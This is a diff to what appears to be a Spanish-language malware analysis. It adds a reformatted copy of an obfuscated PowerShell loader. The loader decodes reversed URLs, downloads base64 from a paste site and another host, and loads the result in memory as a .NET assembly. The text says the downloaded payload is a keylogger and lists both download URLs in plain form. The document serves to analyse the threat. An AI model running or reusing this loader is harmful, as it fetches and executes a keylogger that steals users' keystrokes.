@@ -25,6 +25,13 @@ powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command
 $dll = '0/8JMh1/r/ee.etsap//:sptth';$RumpeD = (New-Object Net.WebClient).DownloadString( $dll[-1..-$dll.Length] -join '' );[Byte[]] $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' );[Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.26602408211/sbv/erots.sbvle//:ptth'))9h
 ```
 
+```
+$dll = '0/8JMh1/r/ee.etsap//:sptth';
+$RumpeD = (New-Object Net.WebClient).DownloadString( $dll[-1..-$dll.Length] -join '' );
+[Byte[]] $Rumpe = [System.Convert]::FromBase64String($RumpeD[-1..-$RumpeD.Length] -join '' );
+[Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.26602408211/sbv/erots.sbvle//:ptth'))9h
+```
+
 Pueden evidenciarse dos urls desde donde se descargan otras cadenas en base64 que contienen un keylogger:
 - https://paste.ee/r/1hMJ8/0
 - http://elvbs.store/vbs/11280420662.txt
